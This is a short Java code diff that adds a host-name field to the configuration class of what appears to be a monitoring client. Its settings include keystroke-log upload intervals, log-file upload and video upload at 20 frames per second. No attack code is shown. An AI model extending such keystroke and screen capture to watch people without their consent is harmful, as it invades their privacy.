@@ -61,6 +61,7 @@ public class Config {
   private int fPS;
   private int keyLogUploadInterval;
   private String clientName;
+  private String hostName;
   private String id;
   private boolean logFileUpload;
   private boolean videoUpload;
@@ -85,6 +86,7 @@ public class Config {
     this.fPS = 20;
     this.keyLogUploadInterval = 600000;
     this.clientName = "";
+    this.hostName = this.getHostName();
     this.id = "";
     this.logFileUpload = true;
     this.videoUpload = true;
